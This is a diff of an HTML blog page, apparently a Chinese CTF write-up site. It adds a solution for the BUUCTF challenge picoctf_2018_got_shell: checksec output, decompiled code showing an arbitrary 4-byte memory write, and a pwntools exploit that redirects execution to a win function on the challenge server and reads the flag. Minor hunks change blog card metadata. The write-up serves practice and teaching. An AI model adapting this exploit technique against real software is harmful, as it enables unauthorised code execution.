@@ -842,6 +842,66 @@ r<span class="token punctuation">.</span>sendlineafter<span class="token punctua
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#picoctf_2018_got_shell">picoctf_2018_got_shell</a></h2><p>检查保护</p>
+<pre class="line-numbers language-none"><code class="language-none">[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;picoctf_2018_got_shell&#x2F;pwn&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>反汇编查看</p>
+<pre class="line-numbers language-none"><code class="language-none">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+&#123;
+  _DWORD *v3; &#x2F;&#x2F; [esp+14h] [ebp-114h] BYREF
+  int v4; &#x2F;&#x2F; [esp+18h] [ebp-110h] BYREF
+  char s[256]; &#x2F;&#x2F; [esp+1Ch] [ebp-10Ch] BYREF
+  unsigned int v6; &#x2F;&#x2F; [esp+11Ch] [ebp-Ch]
+
+  v6 &#x3D; __readgsdword(0x14u);
+  setvbuf(_bss_start, 0, 2, 0);
+  puts(&quot;I&#39;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;);
+  __isoc99_scanf(&quot;%x&quot;, &amp;v3);
+  sprintf(s, &quot;Okay, now what value would you like to write to 0x%x&quot;, v3);
+  puts(s);
+  __isoc99_scanf(&quot;%x&quot;, &amp;v4);
+  sprintf(s, &quot;Okay, writing 0x%x to 0x%x&quot;, v4, v3);
+  puts(s);
+  *v3 &#x3D; v4;
+  puts(&quot;Okay, exiting now...\n&quot;);
+  exit(1);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以直接向一个地址写入内容，还有<code>win</code>函数，直接改返回地址为<code>win</code>函数地址即可<code>getshell</code></p>
+<p>exp如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+
+debug <span class="token operator">=</span> <span class="token number">1</span> 
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26366</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x804A014</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Okay, now what value would you like to write to"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x804854B</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Okay, exiting now...'</span><span class="token punctuation">,</span> <span class="token string">b'cat flag.txt'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -968,7 +1028,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            leetcode刷题记录
                         
                     </div>
                     <div class="publish-info">
@@ -977,8 +1037,12 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            StarrySky
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%AE%97%E6%B3%95/" class="post-category">
+                                    算法
+                                </a>
+                            
                             
                         </span>
                     </div>
